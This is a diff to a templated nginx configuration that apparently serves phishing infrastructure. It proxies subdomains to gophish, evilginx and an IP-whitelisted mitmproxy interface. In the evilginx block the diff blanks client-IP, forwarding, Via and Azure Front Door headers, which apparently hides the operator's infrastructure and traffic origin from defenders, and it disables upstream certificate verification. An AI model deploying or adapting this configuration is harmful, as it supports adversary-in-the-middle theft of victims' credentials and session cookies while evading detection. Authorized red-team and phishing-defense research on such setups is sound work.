@@ -53,6 +53,26 @@ server {
     }
   }
 
+server {
+    server_name {{ mitmproxy_hostname }}.{{ domain_name }};
+    listen 443 ssl;
+    ssl_certificate /etc/letsencrypt/live/{{ domain_name }}/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/{{ domain_name }}/privkey.pem;
+    include /etc/nginx/options-ssl-nginx.conf;
+
+    location / {
+      proxy_set_header Upgrade $http_upgrade;
+      proxy_set_header Connection "Upgrade";
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header Host $host;
+      proxy_set_header X-Forwarded-Proto $scheme;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_pass http://mitmproxy:8081;
+      allow {{ white_list_ip }};
+      deny all;
+    }
+  }
+
   server {
     server_name {{ gophish_site_hostname }}.{{ domain_name }};
     listen 443 ssl;
@@ -81,9 +101,19 @@ server {
       proxy_ssl_server_name on;
       proxy_ssl_name $host;
       proxy_set_header Host $host;
-      proxy_set_header X-Real-IP $remote_addr;
-      proxy_set_header X-Forwarded-For $remote_addr;
-      proxy_ssl_protocols  TLSv1 TLSv1.1 TLSv1.2;
+      proxy_set_header X-Real-IP "";
+      proxy_set_header X-Forwarded-For "";
+      proxy_set_header X-Forwarded-Proto "";
+      proxy_set_header X-Forwarded-Host "";
+      proxy_set_header X-Azure-Socketip "";
+      proxy_set_header X-Azure-Requestchain "";
+      proxy_set_header X-Azure-Ref "";
+      proxy_set_header X-Azure-Ipdetection "";
+      proxy_set_header X-Azure-Fdid "";
+      proxy_set_header X-Azure-Clientip "";
+      proxy_set_header Via "";
+      proxy_set_header X-Msedge-Ignoreratelimits "";
+      proxy_ssl_protocols  TLSv1 TLSv1.1 TLSv1.2; 
       proxy_ssl_verify off;
       proxy_pass https://evilginx:443;
     }
